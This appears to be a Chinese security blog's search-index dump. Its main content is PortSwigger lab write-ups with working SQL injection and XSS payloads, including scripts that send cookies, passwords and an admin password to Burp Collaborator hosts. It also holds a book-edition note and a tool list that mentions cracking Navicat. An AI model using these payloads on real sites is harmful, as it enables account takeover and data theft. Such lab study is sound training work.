table_name,null from information_schema.tables-- '——查询数据库的表名 一般users_开头的表名，存放着用户名和密码，所以 Ctrl + f 搜索users_ 找到了users_squiqq 列 ' union select column_name,null from information_schema.columns where table_name='users_squiqq'-- ' username_fklyld password_vqihba 检索所有的用户名和密码 ' union select username_fklyld,password_vqihba from users_squiqq-- 找到 administrator 的密码为 kb1zf7n2k5jf1gxst3q8 SQL注入攻击，列出Oracle上的数据库内容 确定列数为 2 ，' union select null,null from dual-- 数据库 Oracle 查询需要加 from dual 查看每列的数据类型 ' union select 'a','b' from dual-- ，页面 200，表明是字符型 因为数据库是“Oracle” Oracle SELECT * FROM all_tables SELECT * FROM all_tab_columns WHERE table_name = ‘TABLE-NAME-HERE’` 紧接着，要列出数据库中存在的表以及这些表包含的列 从 [SQL injection cheat sheet](SQL injection cheat sheet | Web Security Academy (portswigger.net))中找到 Oracle 的数据表是 all_tables 通过搜索 all_tables Oracle 找到表的字段名是TABLE_NAME 找到包含用户密码的表的名字 ' union select TABLE_NAME,null from all_tables-- 一般users_开头的表名，存放着用户名和密码，所以 Ctrl + f 搜索users_得到USERS_EKARCY 找到包含用户密码的列的名字 从 [SQL injection cheat sheet](SQL injection cheat sheet | Web Security Academy (portswigger.net))中找到 all_tab_columns，这是一个数据表的名字；通过搜索 all_tab_columns Oracle找到表的字段名是COLUMN_NAME ' union select COLUMN_NAME,null from all_tab_columns where table_name = 'USERS_EKARCY'-- USERNAME_VYRGKY PASSWORD_TWCYAQ 最后查询用户名和密码登录即可 ' union select USERNAME_VYRGKY,PASSWORD_TWCYAQ from USERS_EKARCY-- administrator；q6jra0hcl8lu1hmjge4m 具有条件响应的盲 SQL 注入 目标为枚举管理员密码，以管理员用户登录。如果查询有结果，页面会显示“welcome back” 首先要确认参数容易受到 SQL 注入 在 cookie 中注入参数 welcome back --&gt; true ' and 1=1-- TrackingId=fL8CZZ0ptOt9cR8T' and 1=1--，前面参数一定是 true， 1=1 也是 true no welcome back --&gt; false TrackingId=fL8CZZ0ptOt9cR8T' and 1=0--，前面参数一定是 true， 1=0 是 false。true and false = false 服务器根据' and 1=1--（true）和' and 1=0--（false）做出不同响应，所以可以使用盲注来推断数据库中的内容 确认数据库中存在用户表“users” ' and (select 'x' from users limit 1) = 'x'-- 'x' = 'x' --&gt; true；返回 welcome back limit 子句用于限制 SELECT 语句中查询的数据的数量，limit 1，限制查询结果为 1 确认用户表中有用户名字段“administrator” ' and (select username from users where username='administrator') = 'administrator'-- 'administrator' = 'administrator' --&gt; true；返回 welcome back，说明 administrator 的用户名字段存在 找到管理员用户 administrator 的密码长度 ' and (select 'a' from users where username='administrator' and length(password)&gt;1)='a'-- 'a'='a'–&gt; true；返回 welcome back send to intruder 测试对应位置的密码字符 用到一个函数，SUBSTRING(password,m,n)，password 是字段名，m 是检索的起始位置，n 是数量。SUBSTRING() 函数从字符串中提取一些字符 使用 burp 的 Cluster bomb 爆破，随即登录即可 ' and (select SUBSTRING(password,1,1) from users where username='administrator')='a'-- f9126lip1a49h41x6b17 不是很懂，参考了视频(4) SQL Injection - Lab #11 Blind SQL injection with conditional responses - YouTube 具有条件错误的盲 SQL 注入 审题 题目中依旧是给出了数据表 users，字段 username、password，账户名 administrator 本练习使用 Oracle 数据库 应用程序不会根据查询是否返回任何行而做出任何不同的响应 如果 SQL 查询导致错误，则应用程序将返回自定义错误消息。 证明参数是易受攻击的 添加' --&gt; 返回了 500 删除' --&gt; 返回了 200 ' || (select '') ||' --&gt; 返回了 500，说明数据库是 oracle database ' || (select '' from dual) ||' --&gt; 返回了 200 ' || (select '' from abcde) ||' --&gt; 返回了 500，abcde 是编造的不存在的数据表 验证该users表是否存在 '||(select '' from users where rownum = 1)||' --&gt; 200 说明了 users 是表存在的 rownum = 1 代表查询返回一行 MySQL 支持 LIMIT 语句来选取指定的条数数据 Oracle 可以使用 ROWNUM 来选取 || 在 Oracle中，|| 运算符可以将两个或两个以上的字符串连接在一起。string1 || string2 确认管理员administrator字段 '||(select case when(1=1) then to_char(1/0) else '' end from users where username='administrator' )||' --&gt; 500，验证条件（when (1=1)）是否为真，接收到错误的时候为真（1/0），即确定存在管理员字段administrator 12345casewhen (1=1) then to_char(1/0)else &#x27;&#x27;end-- 1/0 会导致错误 CASE表达式可以在 SQL 中实现if-then-else型的逻辑 123456casewhen 判断语句1 then 返回1when 判断语句2 then 返回2……else 返回nend 密码的长度 '||(select case when length(password)&gt;1 then to_char(1/0) else '' end from users where username='administrator' )||' – 500，条件（条件是密码长度大于 1）为真返回错误 最后确认密码 同样是使用SUBSTR()函数从密码中提取单个字符 '||(select case when substr(password,1,1)='a' then to_char(1/0) else'' end from users where username='administrator')||' 1234casewhen substr(password,1,1)=&#x27;a&#x27; then to_char(1/0)else &#x27;&#x27;end 输出 http 状态码为 500 的时候，说明找到了密码 administrator th7zlh5neuj8mfp5eu4e 具有时间延迟的盲 SQL 注入 首先确定数据库是哪个 '||(select sleep(10))-- ' --&gt; '||(select pg_sleep(10))-- ' --&gt; 发现需要 10s 的响应时间 12select tracking-id from tracking-tablewhere trackingid=&#x27;pvhzsNX3X3hoWEpS&#x27;||(select pg_sleep(10))-- &#x27;; 具有时间延迟和信息检索的盲SQL注入 查看是否存在 SQL 注入 x'%3BSELECT+CASE+WHEN(1=1)+THEN+pg_sleep(10)+ELSE+pg_sleep(0)+END-- --&gt; 验证需要 10s 的延迟 x'%3BSELECT+CASE+WHEN(1=1)+THEN+pg_sleep(10)+ELSE+pg_sleep(0)+END-- --&gt; 不延迟 %3b 是为了关闭初始查询，亦即; URL Decode 是否存在用户 administrator x'%3BSELECT+CASE+WHEN+(username='administrator')+THEN+pg_sleep(10)+ELSE+pg_sleep(0)+END+FROM+users-- --&gt; 延迟说明存在 administrator 确认密码长度 x'%3BSELECT+CASE+WHEN+(username='administrator'+AND+LENGTH(password)&gt;1)+THEN+pg_sleep(10)+ELSE+pg_sleep(0)+END+FROM+users-- --&gt; 延迟说明密码长度大于 1，后续直接 send to intruder，最后获知长度为 20 确认密码 依旧是使用SUBSTRING()函数，不再一一述说了 x'%3BSELECT+CASE+WHEN+(username='administrator'+AND+SUBSTRING(password,1,1)='a')+THEN+pg_sleep(5)+ELSE+pg_sleep(0)+END+FROM+users-- 带外交互的盲 SQL 注入 目的为利用 SQL 注入漏洞并导致 DNS 查找 用 bp 获得域名，点击左上角的“Burp Collaborator client”， mi8yxtn3qtnpoh63xlday2g2ltrjf8.oastify.com 1&#x27; UNION SELECT EXTRACTVALUE(xmltype(&#x27;&lt;?xml version=&quot;1.0&quot; encoding=&quot;UTF-8&quot;?&gt;&lt;!DOCTYPE root [ &lt;!ENTITY % remote SYSTEM &quot;http://mi8yxtn3qtnpoh63xlday2g2ltrjf8.oastify.com/&quot;&gt; %remote;]&gt;&#x27;),&#x27;/l&#x27;) FROM dual-- 1EXTRACTVALUE(xmltype(&#x27;&lt;?xml version=&quot;1.0&quot; encoding=&quot;UTF-8&quot;?&gt;&lt;!DOCTYPE root [ &lt;!ENTITY % remote SYSTEM &quot;http://mi8yxtn3qtnpoh63xlday2g2ltrjf8.oastify.com/&quot;&gt; %remote;]&gt;&#x27;),&#x27;/l&#x27;) EXTRACTVALUE函数接受一个XMLType实例和一个XPath表达式作为参数，并返回结果节点的标量值。 带外数据泄露的盲 SQL 注入 依旧是上个题目的套路 1&#x27; UNION SELECT EXTRACTVALUE(xmltype(&#x27;&lt;?xml version=&quot;1.0&quot; encoding=&quot;UTF-8&quot;?&gt;&lt;!DOCTYPE root [ &lt;!ENTITY % remote SYSTEM &quot;http://&#x27;||(SELECT password FROM users WHERE username=&#x27;administrator&#x27;)||&#x27;.pa3ibzffnv0xwjux3xrj6wdci3oucj.oastify.com/&quot;&gt; %remote;]&gt;&#x27;),&#x27;/l&#x27;) FROM dual-- 通过 XML 3编码绕过过滤器的 SQL 注入 需要装一个插件 Hackvertor。使用说明Hackvertor-Github","tags":["靶场","SQL注入"],"categories":["网络安全"]},{"title":"portswigger 靶场之 XSS 篇(下)","path":"/2022/06/15/xss-part2/","content":"APPRENTICE All labs | Web Security Academy (portswigger.net) 14. 利用跨站点脚本窃取 cookie 在 burp 中使用 Burp Collaborator Client，点击 copy to clipboard。 同时提交博客评论，修改 Burp Collaborator 子域名。 脚本的功能：查看评论的人发出 POST 请求以及 读取 cookie。 123456789&lt;script&gt;fetch(&#x27;https://qe8bejkmbudhod20kznmpm8v5mbcz1.oastify.com&#x27;, &#123;method: &#x27;POST&#x27;,mode: &#x27;no-cors&#x27;,body:document.cookie&#125;);&lt;/script&gt;// document.cookie --&gt; JavaScript 可以使用 document.cookie 属性来创建 、读取、及删除 cookie。 回到 Burp Collaborator，单击“Poll now”，以便看到 Http 交互从而找到 Cookie 值进行替换 刷新 Home 主页，在 Burp Repeater 中，Cookie 替换 Send 发送 15. 利用跨站点脚本捕获密码 依旧是在 burp 中使用 Burp Collaborator Client 功能，点击 copy to clipboard。然后评论博客注入脚本（查看评论的话，会发出包含其用户名和密码的 POST 请求）。 回到 Burp Collaborator，单击“Poll now”，找到用户名和密码进行登录即可 12345678910&lt;input name=username id=username&gt;&lt;input type=password name=password onchange=&quot;if(this.value.length)fetch(&#x27;https://6pwdbg28z2wmxtzpbexotcyig9mzao.oastify.com&#x27;,&#123;method:&#x27;POST&#x27;,mode: &#x27;no-cors&#x27;,body:username.value+&#x27;:&#x27;+this.value&#125;);&quot;&gt;// onchange 事件 --&gt; 当用户改变input输入框内容时执行一段Javascript代码：administrator:2vlk8eidq808je5v2p8v 16. 利用 XSS 执行 CSRF 先进行登录，在更新电子邮件的位置审查元素，会发现存在 CSRF Token，修改电子邮件获取 CSRF Token 的值 将以下脚本写入博客评论中 123456789101112&lt;script&gt;var req = new XMLHttpRequest();req.onload = handleResponse;req.open(&#x27;get&#x27;,&#x27;/my-account&#x27;,true);req.send();function handleResponse() &#123;var token = this.responseText.match(/name=&quot;csrf&quot; value=&quot;(\\w+)&quot;/)[1];var changeReq = new XMLHttpRequest();changeReq.open(&#x27;post&#x27;, &#x27;/my-account/change-email&#x27;, true);changeReq.send(&#x27;csrf=&#x27;+token+&#x27;&amp;email=test@test.com&#x27;)&#125;;&lt;/script&gt; 17. 将 XSS 反射到 HTML 上下文中，大多数标签和属性被阻止 插入 XSS &lt;img src=1 onerror=print()&gt; 发现失败了，用 burp 抓包发送到 Burp Intruder 测试哪些标签和属性被阻止，先清除标签Clear §，然后将搜索词的值换为&lt;§§&gt;，在 XSS 备忘单点击Copy tags to clipboard 在 Burp Intruder 的 Payloads 选项卡中，单击“Paste”粘贴。点击“start attack”。看到了 body 和custom tags 响应 200，于是知道了 body 没有过滤 继而将搜索词的值换为&lt;body%20§§=1&gt;，在 XSS 备忘单点击Copy events to clipboard Clear 删除之前的 Payload，paste 粘贴刚复制的，点击“start attack”，发现 onresize 响应 200 1234// 在 Go to exploit server 的 body 中&lt;iframe src=&quot;https://0a3600a6032533acc04d05d10149009f.web-security-academy.net/?search=%22%3E%3Cbody%20onresize=print()%3E&quot; onload=this.style.width=&#x27;100px&#x27;&gt; // search=&quot;&gt;&lt;body onresize=print()&gt;&quot; --&gt; search=%22%3E%3Cbody%20onresize=print()%3E&quot; 18. 将 XSS 反射到 HTML 上下文中，除了自定义标签外，所有标签都被阻止 自定义标记 XSS 12345&lt;script&gt;location = &#x27;https://0ac80018037267b7c24cf04d00d300df.web-security-academy.net/?search=%3Cxss+id%3Dx+onfocus%3Dalert%28document.cookie%29%20tabindex=1%3E#x&#x27;;&lt;/script&gt;// search=&lt;xss+id=x+onfocus=alert(document.cookie) tabindex=1&gt;#x&#x27;; 19. 允许带有一些 SVG 标记的反射型 XSS 根据标题，测试一下是否可以用 &lt;svg&gt;。搜索框中输入 123&lt;svg&gt;&lt;animatetransform onbegin=alert(1) attributeName=transform&gt;// onBegin() (当元素周期开始时由 onbegin 事件立即触发) 20. 规范链接标签中反映的 XSS 123https://0ad700e904e18a69c0580c0a00f50068.web-security-academy.net/?%27accesskey=%27x%27onclick=%27alert(1)%27accesskey=%27x%27onclick=%27alert(1) --&gt; &#x27;accesskey=&#x27;x&#x27;onclick=&#x27;alert(1) 21. 将 XSS 反射为带有单引号和反斜杠转义的 JavaScript 字符串 输入&lt;script&gt;alert(1)&lt;/script&gt;发现（图一） 于是直接使用两个弹窗123&quot;&lt;script&gt;alert(1)&lt;/script&gt;&quot;&lt;script&gt;alert(1)&lt;/script&gt;（图二） （图一） （图二） 22. 将 XSS 反映到带有尖括号和双引号的 JavaScript 字符串中 HTML 编码和单引号转义 输入后的东西会先被 HTML 编码，然后再被 URL 编码 12345678910// 弹窗&lt;script&gt;alert(1)&lt;/script&gt;// Html 编码&amp;lt;script&amp;gt;alert(1)&amp;lt;/script&amp;gt;// Url 编码%26lt%3Bscript%26gt%3Balert(1)%26lt%3B%2Fscript%26gt%3B// encodeURIComponent() 函数可把字符串作为 URI 组件进行编码。 注意到\\没有进行编码 1123\\&#x27;+alert(1); // 23. 将 XSS 反映到带有尖括号、单引号、双引号、反斜杠和反引号的模板文字中 Unicode 转义 HTML 解码： http://aaa&amp;apos;+alert(1)+&amp;apos; --&gt; http://aaa'+alert(1)+' &amp;apos; 进行 Html 解码后是 ' 1http://aaa&amp;apos;+alert(1)+&amp;apos; EXPERT 24. 带有事件处理程序和 href 属性的反射型 XSS 被阻止 模板字符串 - JavaScript | MDN (mozilla.org) 1$&#123;alert(1)&#125; 25. 在 JavaScript URL 中反映了 XSS 并阻止了一些字符 1&lt;svg&gt;&lt;a&gt;&lt;animate attributeName=href values=&quot;javascript:alert(1)&quot; dur=1s repeatCount=2 /&gt;&lt;text x=20 y=20&gt;Click Me&lt;/text&gt;&lt;/a&gt; 26. 反射 XSS 与 AngularJS 沙箱转义没有字符串 1234567// 问题点angular.module(&#x27;labApp&#x27;, []).controller(&#x27;vulnCtrl&#x27;,function($scope, $parse) &#123;$scope.query = &#123;&#125;;var key = &#x27;search&#x27;;$scope.query[key] = &#x27;123&#x27;;$scope.value = $parse(key)($scope.query);&#125;); 1https://0ae600a2036e6b38c13fc17000230068.web-security-academy.net/?search=1&amp;toString().constructor.prototype.charAt%3d[].join;[1]|orderBy:toString().constructor.fromCharCode(120,61,97,108,101,114,116,40,49,41)=1 27. 使用 AngularJS 沙箱转义和 CSP 的反射 XSS 123&lt;script&gt;location=&#x27;https://0a140035033feb4dc106573801c300c2.web-security-academy.net/?search=%3Cinput%20id=x%20ng-focus=$event.path|orderBy:%27(z=alert)(document.cookie)%27%3E#x&#x27;;&lt;/script&gt; 28. 受非常严格的 CSP 保护的反射型 XSS，带有悬挂标记攻击 目的是需要修改被害者的 Email 变成 hacker@evil-user.net 需要取 CSRF Token，然后 CSRF PoC 放入 Token，修改邮箱地址…… 30. 受 CSP 保护的反射型 XSS，绕过 CSP 预期解决方案只能在 Chrome 中使用。 123456789https://0a2a00f0049fa705c2fbc4b600460008.web-security-academy.net/?search=%3Cscript%3Ealert%281%29%3C%2Fscript%3E&amp;token=;script-src-elem%20%27unsafe-inline%27// 搜索search=%3Cscript%3Ealert%281%29%3C%2Fscript%3E&amp;token=;script-src-elem%20%27unsafe-inline%27//URL 解码后&lt;script&gt;alert(1)&lt;/script&gt;&amp;token=;script-src-elem &#x27;unsafe-inline&#x27;// unsafe-inline 允许使用内联资源// script-src-elem CSP 内容安全性策略 CSP: script-src-elem - HTTP | MDN (mozilla.org)","tags":["XSS","靶场"],"categories":["网络安全"]},{"title":"portswigger 靶场之 XSS 篇(上)","path":"/2022/06/11/xss-part1/","content":"APPRENTICE All labs | Web Security Academy (portswigger.net) 1. 将 XSS 反射到 HTML 上下文中，没有编码 XSS payload，自是无需多言 1&lt;script&gt;alert(1)&lt;/script&gt; 2. 将 XSS 存储到 HTML 上下文中，没有任何编码 存储型的 XSS 在留言区 3. 文档中的 DOM XSS.使用 source location.search 编写接收器 在搜索查询功能中有基于 DOM 的跨站点脚本漏洞 在搜索框输入&quot;第三个&quot;，可以发现，输入的词被放到了 JavaScript 代码中的 img 标签的 src 属性中，插入 XSS 代码的话需要先闭合，使用&quot;&gt; `，分别闭合 img 标签和 src 属性 123456789101112// 在页面输入&quot;第三个&quot;&lt;img src=&quot;/resources/images/tracker.gif?searchTerms=第三个&gt; // 插入 XSS 代码第一种方法&quot;&gt;&lt;script&gt;alert(3)&lt;/script&gt;&lt;img src=&quot;/resources/images/tracker.gif?searchTerms=&quot;&gt;&lt;script&gt;alert(3)&lt;/script&gt;&quot;&gt; // 插入 XSS 代码第二种方法// 语法：onload，事件在页面载入完成后立即触发，onload=&quot;JavaScriptCode&quot;1&quot; onload=&quot;alert(3)&lt;img src=&quot;/resources/images/tracker.gif?searchTerms=1&quot; onload=&quot;alert(3)&quot;&gt; 1234// 源代码function trackSearch(query) &#123; document.write(&#x27;&lt;img src=&quot;/resources/images/tracker.gif?searchTerms=&#x27;+query+&#x27;&quot;&gt;&#x27;);&#125; 搜索框输入“第三个”，F12 查看情况 插入 XSS 代码第一种方法 插入 XSS 代码第二种方法 4. 使用 source location.search in innerHTML sink 中的 DOM XSS。 1234567891011// 在页面输入&quot;第四个&quot;&lt;span id=&quot;searchMessage&quot;&gt;第四个&lt;/span&gt;// 插入 XSS 代码第一种方法// 语法：onload，当页面载入完毕后执行 Javascript 代码，该事件不可取消&lt;svg onload=alert(4)&gt;&lt;span id=&quot;searchMessage&quot;&gt;&lt;svg onload=&quot;alert(4)&quot;&gt;&lt;/svg&gt;&lt;/span&gt;// 插入 XSS 代码第二种方法// 语法：onerror，当资源加载失败或无法使用时，触发onerror事件，因为前面的 src 为空，那意味着肯定会触发事件&lt;img src=&#x27;&#x27; onerror=&quot;alert(4)&quot;&gt; 搜索框输入“第四个”，F12 查看情况 插入 XSS 代码第一种方法 插入 XSS 代码第二种方法 5. 使用 location.search source 在 jQuery 锚点 href 属性接收器中的 DOM XSS Href 不仅可以跳转路径，也可以放入 JS 代码 1https://0a0000b103823255c2ce2cd0003e00a5.web-security-academy.net/feedback?returnPath=javascript:alert(document.cookie) 在 a 标签中 在 a 标签中注入 XSS 代码 6. 在 jQuery 选择器中使用 hashchange 事件的 DOM 型 XSS HTML 内联框架元素 (&lt;iframe&gt;) ，它能够将另一个 HTML 页面嵌入到当前页面中。 1234https://0a99009f0458a280c12dc1a500730025.web-security-academy.net/#&lt;img src=1 onerror=alert(1)&gt;// 官方给的答案：&lt;iframe src=&quot;https://0a99009f0458a280c12dc1a500730025.web-security-academy.net/#&quot; onload=&quot;this.src+=&#x27;&lt;img src=x onerror=print(6)&gt;&#x27;&quot;&gt;&lt;/iframe&gt; 12345// 源代码$(window).on(&#x27;hashchange&#x27;, function()&#123;var post = $(&#x27;section.blog-list h2:contains(&#x27; + decodeURIComponent(window.location.hash.slice(1)) + &#x27;)&#x27;);if (post) post.get(0).scrollIntoView();&#125;); 直接在网址注入 服务器中修改 body 7. 带尖括号编码的反射型 XSS 尖括号被编码，但是引号没有，在搜索框输入内容后，发现输入的内容展示在了 input 标签的 value 属性中。 onmouseover 属性在鼠标指针移至元素之上时触发，几乎可使用于所有 HTML 元素，也就不限于搜索框input 内容在 input 标签的 value 属性中 输入 \"onmouseover=\"alert(7) 8. 将 XSS 存储到带有双引号 HTML 编码的锚点 href 属性中 评论中输入的内容会成为 a 标签 herf 属性的值 输入 123 查看出于什么位置 javascript:alert(8) 9. 将 XSS 反射到带有尖括号 HTML 编码的 JavaScript 字符串中 输入ABC 发现是出现在了 script 标签中，尝试闭合弹出 12var searchTerms = &#x27;ABC&#x27;;document.write(&#x27;&lt;img src=&quot;/resources/images/tracker.gif?searchTerms=&#x27;+encodeURIComponent(searchTerms)+&#x27;&quot;&gt;&#x27;); 构造 Payload';alert(9);// 输入 123 查看出于什么位置 ';alert(9);// PRACTITIONER 10. 文档中的 DOM XSS.使用源位置编写接收器.在选择元素内搜索 注入&amp;storeId=&lt;script&gt;alert()&lt;/script&gt; 12345678910111213var stores = [&quot;London&quot;,&quot;Paris&quot;,&quot;Milan&quot;];var store = (new URLSearchParams(window.location.search)).get(&#x27;storeId&#x27;);document.write(&#x27;&lt;select name=&quot;storeId&quot;&gt;&#x27;);if(store) &#123; document.write(&#x27;&lt;option selected&gt;&#x27;+store+&#x27;&lt;/option&gt;&#x27;);&#125;for(var i=0;i&lt;stores.length;i++) &#123; if(stores[i] === store) &#123; continue; &#125; document.write(&#x27;&lt;option&gt;&#x27;+stores[i]+&#x27;&lt;/option&gt;&#x27;);&#125;document.write(&#x27;&lt;/select&gt;&#x27;); 输入 ABC 查看出于什么位置 11. AngularJS 表达式中的 DOM XSS，带有尖括号和双引号HTML 编码 Angular 是一个前端框架，&#123;&#123; ... &#125;&#125; 里头其实就是一个模板表达式，Angular 会对其进行求值并转化为字符串输出。可以放入 JavaScript 脚本 [PayloadsAllTheThings-Github](https://github.com/swisskyrepo/PayloadsAllTheThings/blob/master/XSS Injection/XSS in Angular.md) 注入：&#123;&#123;constructor.constructor('alert(1)')()&#125;&#125; Constructor 是一个构造函数 12. 反射式 DOM XSS 13. 存储型 XSS replace()，如果第一个参数是字符串，则仅替换第一个匹配项 12345function escapeHTML(html) &#123; return html.replace(&#x27;&lt;&#x27;, &#x27;&amp;lt;&#x27;).replace(&#x27;&gt;&#x27;, &#x27;&amp;gt;&#x27;);&#125;// 源代码中，通过 replace() 函数，替换第一个匹配项，也就是&lt;&gt;// &amp;lt;代表小于号（&lt;）; &amp;gt;代表大于号（&gt;）","tags":["XSS","靶场"],"categories":["网络安全"]},{"title":"寻书 - 金瓶梅","path":"/2022/05/25/寻书 - 金瓶梅/","content":"词话本（万历本） 最常见的市场流通版本 特点：诗词丰富，风格通俗市井 缺点：谋篇布局较草率，情节矛盾较多 第一回：《景阳冈武松打虎，潘金莲嫌夫卖风月》 绣像本（崇祯本） 齐鲁书社版本 特点：含插画，经过精心修订，写作水准更高 第一回：《西门庆热结十弟兄，武二郎冷遇亲哥嫂》 张竹坡评本（和第一奇书本） 含张竹坡批注评论 版本差异 回目不同：开篇故事起点差异明显 情节不同：崇祯本从西门庆结拜兄弟开始，词话本直接从武松打虎开始 文字风格：词话本保留大量诗词曲赋和韵文，是两版本最大区别 推荐版本 《金瓶梅词话》（香港太平书局1982年版） 繁体字版本 可在Z-Library下载 《梦梅馆校本金瓶梅词话》（2007年里仁书局版） 校订者：梅节 特点：全本无删减的词话本，校订质量高 可在Z-Library下载","tags":["章回体长篇小说"],"categories":["读书计划"]},{"title":"常用网安工具\\命令","path":"/2022/03/11/常用网安工具命令/","content":"工具 工具名称 官网链接 用途描述 常用 BurpSuite portswigger.net 强大的安全测试平台，功能全面。 ✔️（必备） Wireshark wireshark.org 网络协议分析器，可以捕获并交互式分析数据包。 ✔️ Hackerbar hackerbar 浏览器插件，帮助快速构造 HTTP 请求。 御剑 御剑 集成多种渗透测试工具，简化攻击流程。 dirmap dirmap 网站目录扫描工具，寻找隐藏目录和文件。 ✔️ dirsearch dirsearch 一个简单的命令行工具，用于快速扫描目录。 ✔️ sqlmap sqlmap.org sqlmap 是一个自动化的 SQL 注入工具，其主要功能是扫描，发现并利用给定的 URL 进行 SQL 注入 ✔️ pdfinfo pdfinfo 用于提取 PDF 文件元数据的命令行工具。 exiftool exiftool.org 用于读取和写入文件的元数据。 XRAY xray.cool 网络安全扫描工具，支持漏洞扫描和信息收集。 OneForAll OneForAll 子域名收集工具，方便进行信息收集。 ✔️ Hydra thc.org 快速的网络密码破解工具，支持多种协议。 HTTPX HTTPX 用于快速探测和验证 HTTP 服务的工具。 ✔️ CS CS 木马工具，提供反向 shell 等功能。 Fiddler telerik.com/fiddler 捕获 HTTP/HTTPS 流量的调试代理。 finger-ub finger 查找用户信息的网络协议工具。 Dig dig DNS 查询工具，用于获取域名的解析信息。 Onforall-ub Onforall OneForAll是一款功能强大的子域收集工具。 ✔️ FofaViewer-ub fofa.so 用于浏览和分析 Fofa 数据的工具。 水泽 水泽 集成化的安全测试工具，功能丰富。 ✔️ EHole-ub EHole 安全测试框架，提供自动化测试功能。 JSFinder JSFinder 查找网站中的 JS 文件。 ✔️ curl curl.se 命令行工具，用于发送 HTTP 请求，灵活便捷。 Postman postman.com API 测试工具，方便发送请求并分析响应。 nmap nmap.org 网络扫描工具，用于发现网络设备和服务。 蚁剑 蚁剑 WebShell 管理工具，方便管理和使用。 phpMyAdmin phpmyadmin.net 用于管理 MySQL 数据库的 Web 应用。 Web Path Brute Web Path Brute Web 路径暴力探测工具，发现隐藏路径。 PyCharm jetbrains.com/pycharm Python 开发环境，功能强大，支持多种插件。 VirusTotal virustotal.com 在线服务，检查文件和 URL 的安全性。 JDK 11 openjdk.java.net Java 开发必备，支持最新应用。 JDK 8 openjdk.java.net 经典版本，很多老项目依然在用。 JDK 20 目前最新版本的 burpsuit，需要 JDK20 环境 Docker docker.com 用于创建、部署和管理容器化应用的开源平台。 gogo gogo 面向红队的, 高度可控可拓展的自动化引擎 ✔️ Navicat Premium 17 https://www.navicat.com/cht/products 数据库工具，需要破解，可连接 MySQL、MariaDB、MongoDB、SQL Server、Oracle、PostgreSQL 和 SQLite ✔️ ##使用（第一次） wireshark 是什么： 有何种称呼： 网络封包分析软件、网络分析工具、网络抓包工具、网络流量分析 使用过程 wireshark 启动后，wireshark 处于抓包状态中 执行需要抓包的操作，在 CMD 中，如ping www.baidu.com 对数据表设置过滤条件： ip.addr == 36.152.44.96 and icmp 表示只显示 ICPM 协议且源主机 IP 或者目的主机IP为 36.152.44.96 的数据包。 Packet List Pane（数据包列表） 数据包列表区中不同的协议使用了不同的\t颜色区分 Packet Details Pane（数据包详细信息） 在数据包列表中选择指定数据包，在数据包详细信息中会显示数据包的所有详细信息内容。数据包详细信息面板是最重要的，用来查看*协议中的每一个字段*。 Wireshark 过滤器设置 过滤器有两种， 一种是显示过滤器，就是主界面上那个，用来在捕获的记录中找到所需要的记录 一种是捕获过滤器，用来过滤捕获的封包，以免捕获太多的记录。 在Capture -&gt; Capture Filters 中设置 捕获过滤器的菜单栏路径为 Capture --&gt; Capture Filters。用于在抓取数据包前设置。 捕获过滤器 12345# 过滤器名称：Filter Namecapture baidu# 过滤表达式：Filter Expressionip host www.baidu.com 显示过滤器 ip.addr == 36.152.44.96 and icmp 表示只显示 ICPM 协议且源主机 IP 或者目的主机IP为 36.152.44.96 的数据包。 过滤表达式的规则 123456789101112131. 协议过滤比如TCP，只显示TCP协议。2. IP 过滤比如 ip.src ==192.168.1.102 显示源地址为192.168.1.102，ip.dst==192.168.1.102, 目标地址为192.168.1.1023. 端口过滤tcp.port ==80, 端口为80的tcp.srcport == 80, 只显示TCP协议的愿端口为80的。4. Http模式过滤http.request.method==&quot;GET&quot;, 只显示HTTP GET方法的。 常用的过滤表达式 过滤表达式 用途 http 只查看HTTP协议的记录 ip.src ==192.168.1.102 or ip.dst==192.168.1.102 源地址或者目标地址是 192.168.1.102 VirusTotal 在线查毒工具 VirusTotal 的 N 种玩法——从“误报/漏报”聊到“攻击者对它的利用 — 编程随想的博客“ pdfinfo pdfinfo 是一个命令行工具，可以用来获取 PDF 文件的元数据和其他信息，例如文件大小、页面数、作者、标题、创建日期等。它是 Poppler 工具包的一部分，可以在 Linux、macOS 和 Windows 操作系统上使用。pdfinfo 通常被用于批量处理 PDF 文件，例如从文件名中提取元数据、创建文件索引等。 123sudo apt install poppler-utilspdfinfo DOCUMENT.pdf BurpSuite 前期配置 搜索关键词：Burpsuite 设置 HTTPS 代理 先导出证书 第一种方法从 bp 中导出证书 第二种方法从浏览器中导出证书，浏览器开了 127.0.0.1:8080 代理的同时访问http://burp下载证书 再导入证书 火狐导入证书 只要求 burp 拦截与靶机之间的数据包，而不要拦截其他网站的数据包，用到了一个chrome的插件——SwitchyOmega。 FoxyProxy BurpSuite 设置代理，ip和端口要和代理工具SwitchyOmega一致 12345678910打开 burp，设置代理监听地址，默认为127.0.0.1:8080SwitchyOmega——设置浏览器的代理127.0.0.1:8080确认拦截开启/关闭lntercept is on接着网页操作 错误提示 01-Intercept is off — 无法抓取数据包。 无法捕获本机地址 localhost 和 127.0.0.1 的数据包。 分析： localhost 和 127.0.0.1 是知名的本机地址，通常在各种代理设置中默认被排除，浏览器也可能会有单独的配置来禁止抓取这些本机地址的数据包。 为了抓取本机的流量，建议使用本机的内网地址，例如 192.168.xxx.xxx，或者在 hosts 文件中手动绑定一个域名来替代。 此外，如果网站使用了缓存，流量包可能不会经过 Burp。当浏览器缓存了某些资源时，下次访问时会直接从缓存中获取，而不会重新发送请求，这样就导致 Burp 抓不到请求包。 使用 Ctrl+F5 强制刷新，清空缓存以确保请求能够被捕获。 Docker docker pull下来的命令都默认存在/var/lib/docker/文件夹下 Docker 的常用命令 123456789101112131415161718192021222324252627282930313233343536#系统命令systemctl start docker #启动dockersystemctl stop docker #停止dockersystemctl restart docker #重启dockersystemctl enable docker #设置docker开机自启 #基本命令docker version #查看docker版本docker info #查看docker详细信息docker --help #查看docker命令 #镜像命令docker images #查看docker镜像列表docker images -a #列出本地所有镜像docker images --digests #显示镜像的摘要信息docker search redis #从Docker Hub上查找redis镜像docker pull redis #从Docker Hub上下载redis镜像docker rmi 373f0984b070 #删除IMAGE ID 为373f0984b070的镜像 #运行命令#-p 6379:6379\t端口映射：前表示主机部分,后表示容器部分#-d\t在后台运行容器（不进入终端）并打印容器ID/容器名#--name myredis表示自定义容器名为myredisdocker run -d -p 6379:6379 --name myredis redis:latest #根据镜像创建并运行容器 #容器命令docker container ls 或 docker ps #查看正在运行的容器docker container ls -a 或 docker ps -a #列出所有容器docker container start 容器ID 或 容器名称 #启动容器docker start 容器ID 或 容器名称 #启动容器docker container stop 容器ID 或 容器名称 #停止容器docker stop 容器ID 或 